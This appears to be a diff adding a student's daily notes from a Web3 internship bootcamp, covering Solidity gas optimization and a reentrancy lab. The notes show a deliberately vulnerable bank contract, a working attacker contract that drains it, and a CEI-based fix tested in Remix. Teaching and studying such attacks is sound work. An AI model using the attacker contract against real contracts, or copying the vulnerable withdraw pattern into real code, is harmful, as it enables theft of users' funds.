@@ -15,8 +15,592 @@ Web3 实习计划 2025 冬季实习生
 ## Notes
 
 <!-- Content_START -->
+# 2026-01-21
+<!-- DAILY_CHECKIN_2026-01-21_START -->
+## **行动**
+
+-   完成一个 Gas 优化案例
+    
+
+-   完成一个漏洞修复案例
+    
+-   参与co-learning
+    
+
+## **内容**
+
+### **gas优化笔记**
+
+通过一个真实的 NFT 市场合约，创建了优化前（Before）和优化后（After）两个版本进行对比。优化版本应用了 13 种核心技术（位压缩、storage缓存、循环优化、使用 constant/immutable、external+calldata、call 替代 transfer 等），将存储空间从 4 个 slot 压缩到 2 个（节省 50%），单次函数调用节省 25-35% 的 gas。可以直接在 Remix 上部署测试并查看优化效果。
+
+**before：**
+
+```
+pragma solidity ^0.8.0;
+​
+/**
+ * @title NFT市场合约 - 未优化版本
+ */
+contract NFTMarketplace_Before {
+​
+    // 问题1: 使用多个独立的存储变量，没有进行位压缩
+    struct Listing {
+        address seller;      // 20 bytes
+        uint256 price;       // 32 bytes
+        bool isActive;       // 1 byte (但占用完整的 slot)
+        uint256 timestamp;   // 32 bytes
+    }
+​
+    // 问题2: 使用 public mapping，每次访问都读取 storage
+    mapping(uint256 => Listing) public listings;
+    mapping(address => uint256[]) public userListings;
+​
+    uint256 public listingCount;
+    uint256 public totalVolume;
+    address public owner;
+    uint256 public feePercentage;
+​
+    event ItemListed(uint256 indexed tokenId, address indexed seller, uint256 price);
+    event ItemSold(uint256 indexed tokenId, address indexed buyer, uint256 price);
+​
+    constructor() {
+        owner = msg.sender;
+        feePercentage = 250; // 2.5%
+    }
+​
+    // 问题3: 使用 public 而不是 external
+    // 问题4: 多次读写 storage
+    function listItem(uint256 tokenId, uint256 price) public {
+        require(price > 0, "Price must be greater than 0");
+​
+        // 多次读取 listingCount
+        listings[listingCount] = Listing({
+            seller: msg.sender,
+            price: price,
+            isActive: true,
+            timestamp: block.timestamp
+        });
+​
+        // 多次写入 storage
+        userListings[msg.sender].push(listingCount);
+        listingCount = listingCount + 1; // 使用 + 而不是 ++
+​
+        emit ItemListed(tokenId, msg.sender, price);
+    }
+​
+    // 问题5: 循环中多次读取 array.length
+    // 问题6: 循环中多次读取 storage
+    function getUserListings(address user) public view returns (uint256[] memory) {
+        uint256[] memory result = new uint256[](userListings[user].length);
+​
+        // 每次迭代都读取 userListings[user].length
+        for (uint256 i = 0; i < userListings[user].length; i++) {
+            result[i] = userListings[user][i];
+        }
+​
+        return result;
+    }
+​
+    // 问题7: 重复的存储读取
+    function buyItem(uint256 listingId) public payable {
+        // 第一次读取
+        require(listings[listingId].isActive, "Listing not active");
+        // 第二次读取
+        require(msg.value >= listings[listingId].price, "Insufficient payment");
+​
+        // 第三次读取
+        uint256 price = listings[listingId].price;
+        // 第四次读取
+        address seller = listings[listingId].seller;
+​
+        // 计算费用 (可以优化)
+        uint256 fee = (price * feePercentage) / 10000;
+        uint256 sellerAmount = price - fee;
+​
+        // 多次写入 storage
+        listings[listingId].isActive = false;
+        totalVolume = totalVolume + price;
+​
+        // 问题11: 使用 transfer (已废弃，且有 gas 限制问题)
+        // transfer 限制 2300 gas，可能导致接收方合约无法执行
+        payable(seller).transfer(sellerAmount);
+        payable(owner).transfer(fee);
+​
+        emit ItemSold(listingId, msg.sender, price);
+    }
+​
+    // 问题8: 不必要的 storage 读取
+    function cancelListing(uint256 listingId) public {
+        require(listings[listingId].seller == msg.sender, "Not the seller");
+        require(listings[listingId].isActive, "Already inactive");
+​
+        listings[listingId].isActive = false;
+    }
+​
+    // 问题9: 字符串比较效率低
+    function updateFee(uint256 newFee, string memory password) public {
+        require(msg.sender == owner, "Not owner");
+        // 字符串比较
+        require(
+            keccak256(abi.encodePacked(password)) == keccak256(abi.encodePacked("admin123")),
+            "Wrong password"
+        );
+        feePercentage = newFee;
+    }
+​
+    // 问题10: 循环中的复杂计算
+    function batchCancelListings(uint256[] memory listingIds) public {
+        for (uint256 i = 0; i < listingIds.length; i++) {
+            // 每次循环都读取 storage
+            if (listings[listingIds[i]].seller == msg.sender &&
+                listings[listingIds[i]].isActive) {
+                listings[listingIds[i]].isActive = false;
+            }
+        }
+    }
+}
+```
+
+**after：**
+
+```
+pragma solidity ^0.8.0;
+​
+/**
+ * @title NFT市场合约 - 优化版本
+ */
+contract NFTMarketplace_After {
+​
+    // 优化1: 位压缩 - 将多个变量打包到同一个 storage slot
+    struct Listing {
+        address seller;      // 20 bytes - slot 0
+        uint96 price;        // 12 bytes - slot 0 (uint96 足够存储价格)
+        bool isActive;       // 1 byte  - slot 1
+        uint32 timestamp;    // 4 bytes - slot 1 (uint32 可以存储到 2106 年)
+        // 总共使用 2 个 slot 而不是 4 个！
+    }
+​
+    // 优化2: 使用 private/internal 而不是 public (减少自动 getter)
+    mapping(uint256 => Listing) private listings;
+    mapping(address => uint256[]) private userListings;
+​
+    uint256 private listingCount;
+    uint256 private totalVolume;
+    address private immutable owner; // 使用 immutable 节省 gas
+    uint256 private constant FEE_PERCENTAGE = 250; // 使用 constant
+    uint256 private dynamicFeePercentage; // 可动态调整的费率（如果需要）
+​
+    event ItemListed(uint256 indexed tokenId, address indexed seller, uint256 price);
+    event ItemSold(uint256 indexed tokenId, address indexed buyer, uint256 price);
+​
+    constructor() {
+        owner = msg.sender;
+        dynamicFeePercentage = FEE_PERCENTAGE; // 初始化为默认值
+    }
+​
+    // 优化3: 使用 external 而不是 public
+    // 优化4: 缓存 storage 变量到 memory
+    function listItem(uint256 tokenId, uint96 price) external {
+        require(price > 0, "Price must be greater than 0");
+​
+        // 缓存 listingCount 到局部变量，避免多次 SLOAD
+        uint256 currentListingId = listingCount;
+​
+        listings[currentListingId] = Listing({
+            seller: msg.sender,
+            price: price,
+            isActive: true,
+            timestamp: uint32(block.timestamp)
+        });
+​
+        userListings[msg.sender].push(currentListingId);
+​
+        // 使用 unchecked 块优化算术运算 (Solidity 0.8+ 默认检查溢出)
+        unchecked {
+            listingCount = currentListingId + 1;
+        }
+​
+        emit ItemListed(tokenId, msg.sender, price);
+    }
+​
+    // 优化5: 缓存 array.length
+    // 优化6: 使用 ++i 而不是 i++
+    function getUserListings(address user) external view returns (uint256[] memory) {
+        uint256[] storage userListing = userListings[user];
+        uint256 length = userListing.length; // 缓存长度
+​
+        uint256[] memory result = new uint256[](length);
+​
+        for (uint256 i = 0; i < length;) {
+            result[i] = userListing[i];
+            unchecked { ++i; } // ++i 比 i++ 节省 gas
+        }
+​
+        return result;
+    }
+​
+    // 优化7: 一次性读取 storage 到 memory
+    function buyItem(uint256 listingId) external payable {
+        // 一次性读取整个 struct 到 memory
+        Listing memory listing = listings[listingId];
+​
+        require(listing.isActive, "Listing not active");
+        require(msg.value >= listing.price, "Insufficient payment");
+​
+        // 使用 memory 变量进行计算
+        uint256 price = listing.price;
+        address seller = listing.seller;
+​
+        // 优化8: 使用位运算代替除法 (如果可能)
+        // fee = (price * 250) / 10000 = price * 0.025
+        uint256 fee = (price * FEE_PERCENTAGE) / 10000;
+        uint256 sellerAmount;
+        unchecked {
+            sellerAmount = price - fee;
+        }
+​
+        // 优化9: 批量更新 storage (先计算，最后一次性写入)
+        listings[listingId].isActive = false;
+​
+        unchecked {
+            totalVolume += price;
+        }
+​
+        // 优化10: 使用 call 而不是 transfer (更灵活且节省 gas)
+        (bool successSeller,) = payable(seller).call{value: sellerAmount}("");
+        require(successSeller, "Transfer to seller failed");
+​
+        (bool successOwner,) = payable(owner).call{value: fee}("");
+        require(successOwner, "Transfer to owner failed");
+​
+        emit ItemSold(listingId, msg.sender, price);
+    }
+​
+    // 优化11: 短路条件判断，先检查更便宜的条件
+    function cancelListing(uint256 listingId) external {
+        Listing storage listing = listings[listingId];
+​
+        // 先检查 msg.sender (更便宜)，再检查 isActive
+        require(listing.seller == msg.sender, "Not the seller");
+        require(listing.isActive, "Already inactive");
+​
+        listing.isActive = false;
+    }
+​
+    // 优化12: 移除不必要的字符串比较，使用 modifier
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Not owner");
+        _;
+    }
+​
+    function updateFee(uint256 newFee) external onlyOwner {
+        // 移除了字符串密码验证，使用更安全的 onlyOwner modifier
+        require(newFee <= 1000, "Fee too high"); // 10% 上限
+        dynamicFeePercentage = newFee;
+    }
+​
+    // 优化13: 批量操作优化
+    function batchCancelListings(uint256[] calldata listingIds) external {
+        uint256 length = listingIds.length;
+​
+        for (uint256 i = 0; i < length;) {
+            uint256 listingId = listingIds[i];
+            Listing storage listing = listings[listingId];
+​
+            // 使用局部变量减少 storage 访问
+            if (listing.seller == msg.sender && listing.isActive) {
+                listing.isActive = false;
+            }
+​
+            unchecked { ++i; }
+        }
+    }
+​
+    // 额外优化: 使用 calldata 而不是 memory (对于外部函数的数组参数)
+    function batchListItems(uint256[] calldata tokenIds, uint96[] calldata prices) external {
+        require(tokenIds.length == prices.length, "Length mismatch");
+​
+        uint256 length = tokenIds.length;
+        uint256 currentCount = listingCount;
+​
+        for (uint256 i = 0; i < length;) {
+            uint256 tokenId = tokenIds[i];
+            uint96 price = prices[i];
+​
+            require(price > 0, "Price must be greater than 0");
+​
+            listings[currentCount] = Listing({
+                seller: msg.sender,
+                price: price,
+                isActive: true,
+                timestamp: uint32(block.timestamp)
+            });
+​
+            userListings[msg.sender].push(currentCount);
+​
+            emit ItemListed(tokenId, msg.sender, price);
+​
+            unchecked {
+                ++currentCount;
+                ++i;
+            }
+        }
+​
+        listingCount = currentCount;
+    }
+​
+    // View 函数优化: 提供 getter 函数
+    function getListing(uint256 listingId) external view returns (Listing memory) {
+        return listings[listingId];
+    }
+​
+    function getListingCount() external view returns (uint256) {
+        return listingCount;
+    }
+​
+    function getTotalVolume() external view returns (uint256) {
+        return totalVolume;
+    }
+​
+    function getOwner() external view returns (address) {
+        return owner;
+    }
+​
+    function getFeePercentage() external pure returns (uint256) {
+        return FEE_PERCENTAGE; // 返回 constant 默认费率
+    }
+​
+    function getDynamicFeePercentage() external view returns (uint256) {
+        return dynamicFeePercentage; // 返回可调整的动态费率
+    }
+}
+```
+
+以上架（ListItem）为例，优化前gas：138448
+
+![屏幕截图 2026-01-21 102309.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/bonujel/images/2026-01-21-1768976309741-_____2026-01-21_102309.png)
+
+优化后gas：94569
+
+![屏幕截图 2026-01-21 102854.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/bonujel/images/2026-01-21-1768976325419-_____2026-01-21_102854.png)
+
+### **漏洞修复笔记**
+
+**三个合约**
+
+VulnerableBank（漏洞合约）：先转账后更新余额，允许攻击者在 receive() 回调中重复调用 withdraw() 函数，成功盗取了所有用户的资金
+
+```
+pragma solidity ^0.8.0;
+​
+/**
+ * @title VulnerableBank
+ *
+ * 漏洞分析：
+ * 1. withdraw() 函数在转账前未更新余额
+ * 2. 使用 call 进行转账，会触发接收方的 fallback/receive 函数
+ * 3. 攻击者可在 fallback 中重新调用 withdraw()
+ * 4. 由于余额未清零，可重复提取资金
+ */
+contract VulnerableBank {
+    mapping(address => uint256) public balances;
+​
+    event Deposit(address indexed user, uint256 amount);
+    event Withdrawal(address indexed user, uint256 amount);
+​
+    function deposit() public payable {
+        require(msg.value > 0, "Deposit amount must be greater than 0");
+        balances[msg.sender] += msg.value;
+        emit Deposit(msg.sender, msg.value);
+    }
+​
+    function withdraw() public {
+        uint256 balance = balances[msg.sender];
+        require(balance > 0, "Insufficient balance");
+​
+        // 危险：先转账再更新状态
+        (bool sent, ) = msg.sender.call{value: balance}("");
+        require(sent, "Failed to send Ether");
+​
+        // 攻击者已经在上面的 call 中重入
+        balances[msg.sender] = 0;
+        emit Withdrawal(msg.sender, balance);
+    }
+​
+    function getBalance() public view returns (uint256) {
+        return balances[msg.sender];
+    }
+​
+    function getContractBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+
+ReentrancyAttacker（攻击合约）：利用 receive() 函数实现重入，在余额清零前反复提款
+
+```
+pragma solidity ^0.8.0;
+​
+import "./VulnerableBank.sol";
+​
+/**
+ * @title ReentrancyAttacker
+ *
+ * 攻击流程：
+ * 1. 攻击者向 VulnerableBank 存入 1 ETH
+ * 2. 调用 attack() 函数开始攻击
+ * 3. 调用 VulnerableBank.withdraw()
+ * 4. VulnerableBank 向攻击合约转账，触发 receive()
+ * 5. receive() 中再次调用 withdraw()（重入！）
+ * 6. 重复步骤 4-5，直到银行余额耗尽
+ */
+contract ReentrancyAttacker {
+    VulnerableBank public vulnerableBank;
+    address public owner;
+    uint256 public attackCount;
+​
+    event AttackStarted(address attacker);
+    event ReentrancyExecuted(uint256 count, uint256 balance);
+    event AttackCompleted(uint256 totalStolen);
+​
+    constructor(address _vulnerableBankAddress) {
+        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
+        owner = msg.sender;
+    }
+​
+    function attack() external payable {
+        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
+        
+        attackCount = 0;
+        
+        emit AttackStarted(msg.sender);
+        
+        vulnerableBank.deposit{value: msg.value}();
+        vulnerableBank.withdraw();
+        
+        emit AttackCompleted(address(this).balance);
+    }
+​
+    receive() external payable {
+        attackCount++;
+        emit ReentrancyExecuted(attackCount, address(vulnerableBank).balance);
+        if (address(vulnerableBank).balance >= 1 ether) {
+            vulnerableBank.withdraw();
+        }
+    }
+​
+    function collectStolenFunds() external {
+        require(msg.sender == owner, "Only owner can collect");
+        (bool sent, ) = owner.call{value: address(this).balance}("");
+        require(sent, "Failed to send Ether");
+    }
+​
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+​
+​
+    function getBankBalance() public view returns (uint256) {
+        return address(vulnerableBank).balance;
+    }
+}
+```
+
+SecureBank（安全合约）：遵循 CEI 模式（先检查、后更新状态、最后外部交互），在转账前先清零余额，成功阻止了重入攻击
+
+```
+pragma solidity ^0.8.0;
+​
+/**
+ * @title SecureBank
+ *
+ * 修复方案：
+ * 1. 遵循 CEI 模式：先检查、后更新状态、最后交互
+ * 2. 使用 ReentrancyGuard（可选的额外保护）
+ * 3. 详细的事件记录用于审计
+ */
+contract SecureBank {
+    mapping(address => uint256) public balances;
+​
+    event Deposit(address indexed user, uint256 amount);
+    event Withdrawal(address indexed user, uint256 amount);
+​
+    function deposit() public payable {
+        require(msg.value > 0, "Deposit amount must be greater than 0");
+        balances[msg.sender] += msg.value;
+        emit Deposit(msg.sender, msg.value);
+    }
+​
+    function withdraw() public {
+        uint256 amount = balances[msg.sender];
+        require(amount > 0, "Insufficient balance");
+​
+        balances[msg.sender] = 0;
+​
+        (bool sent, ) = msg.sender.call{value: amount}("");
+        require(sent, "Failed to send Ether");
+​
+        emit Withdrawal(msg.sender, amount);
+    }
+​
+    function getBalance() public view returns (uint256) {
+        return balances[msg.sender];
+    }
+​
+    function getContractBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+
+**验证结果：**
+
+-   VulnerableBank 被攻破，攻击者从5个用户手中盗取了所有资金（6 ETH）
+    
+-   SecureBank 防御成功，攻击交易失败并回滚，其他用户资金完全安全
+    
+
+这证明了状态更新必须在外部调用之前完成是 Solidity 安全编程的黄金法则。
+
+**有漏洞合约：**
+
+1.  模拟5个账户向有漏洞的合约各转入1eth：
+    
+
+![屏幕截图 2026-01-21 112034.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/bonujel/images/2026-01-21-1768976412621-_____2026-01-21_112034.png)
+
+2.  部署攻击合约：
+    
+
+![屏幕截图 2026-01-21 112439.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/bonujel/images/2026-01-21-1768976428076-_____2026-01-21_112439.png)
+
+3.  发动攻击，balance：6.0 ETH=原本 1 ETH + 盗取的 5 ETH,日志表明发生多次 ReentrancyExecuted 事件：
+    
+
+![屏幕截图 2026-01-21 112659.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/bonujel/images/2026-01-21-1768976453504-_____2026-01-21_112659.png)
+
+4.  原合约balance归零：
+    
+
+![屏幕截图 2026-01-21 112943.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/bonujel/images/2026-01-21-1768976471125-_____2026-01-21_112943.png)
+
+**无漏洞合约：**
+
+1.  模拟五个账户向安全合约各转入1eth：
+    
+
+![屏幕截图 2026-01-21 113548.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/bonujel/images/2026-01-21-1768976539357-_____2026-01-21_113548.png)
+
+2.  攻击失败：
+    
+
+![屏幕截图 2026-01-21 114221.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/bonujel/images/2026-01-21-1768976521807-_____2026-01-21_114221.png)
+<!-- DAILY_CHECKIN_2026-01-21_END -->
+
 # 2026-01-20
 <!-- DAILY_CHECKIN_2026-01-20_START -->
+
 ## **行动**
 
 -   观看《分享会 - Web3 公共物品资金分配第一节课》直播
@@ -30,6 +614,7 @@ Web3 实习计划 2025 冬季实习生
 
 # 2026-01-19
 <!-- DAILY_CHECKIN_2026-01-19_START -->
+
 
 ## **行动**
 
@@ -79,6 +664,7 @@ remixd -s . -u https://remix.ethereum.org
 
 # 2026-01-18
 <!-- DAILY_CHECKIN_2026-01-18_START -->
+
 
 
 ## **行动**
@@ -281,6 +867,7 @@ $$
 
 
 
+
 ## **行动**
 
 -   观看第一周例会直播
@@ -292,6 +879,7 @@ $$
 
 # 2026-01-16
 <!-- DAILY_CHECKIN_2026-01-16_START -->
+
 
 
 
@@ -471,6 +1059,7 @@ Stripe最近也推出了针对AI代理的支付接口（Agentic Commerce Protoco
 
 
 
+
 ## **行动**
 
 1.  通读《web3实习手册》，对整体生态以及求职方向有了比较系统的理解
@@ -557,6 +1146,7 @@ d律分析了具体的业务场景风险，包括发币融资、交易所运营�
 
 # 2026-01-14
 <!-- DAILY_CHECKIN_2026-01-14_START -->
+
 
 
 
@@ -693,6 +1283,7 @@ Gas 不仅仅是费用，它是去中心化网络能持续运行的经济保障�
 
 
 
+
 ## **行动**
 
 -   观看“Web3 行业全局介绍 & 岗位概览“直播
@@ -817,6 +1408,7 @@ event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, addres
 
 # 2026-01-12
 <!-- DAILY_CHECKIN_2026-01-12_START -->
+
 
 
 
